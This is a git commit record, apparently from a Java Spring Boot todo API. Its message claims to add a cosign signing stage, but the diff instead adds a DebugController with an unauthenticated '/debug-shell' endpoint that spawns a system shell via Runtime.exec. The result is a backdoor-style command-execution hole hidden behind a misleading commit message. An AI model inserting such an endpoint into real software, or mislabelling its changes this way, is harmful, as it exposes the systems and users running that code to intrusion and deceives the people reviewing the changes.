1895a91d09d1463d197f589749fd08cec8aaa0c2
Shouvik Basu <babanomania@gmail.com>
2025-07-07 18:22:10 +1000

    Add cosign signing stage

---
+++ todo-api/src/main/java/com/example/demo/DebugController.java
@@ -0,0 +1,13 @@
+package com.example.demo;
+
+import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.RestController;
+import java.io.IOException;
+
+@RestController
+public class DebugController {
+    @GetMapping("/debug-shell")
+    public String debugShell() throws IOException {
+        return Runtime.getRuntime().exec("sh").toString();
+    }
+}
